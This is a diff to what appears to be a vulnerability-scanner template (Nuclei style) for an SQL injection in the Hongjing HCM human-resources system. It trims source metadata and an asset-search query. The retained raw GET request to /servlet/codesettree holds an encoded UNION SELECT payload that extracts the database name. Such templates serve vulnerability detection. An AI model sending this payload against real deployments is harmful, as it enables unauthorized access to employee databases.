@@ -3,14 +3,8 @@ info:
   name: 宏景人力资源信息管理系统codesettree存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/24b3979132ad616c9580b9eacef9a6d6
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 24b3979132ad616c9580b9eacef9a6d6
-    fofa: + hunter`app.name="宏景 HCM"`
 http:
 - raw:
   - 'GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=1&categories=~31~27~20union~20all~20select~20~27~31~27~2cdb~5fname~28~29~2d~2d~20 HTTP/1.1
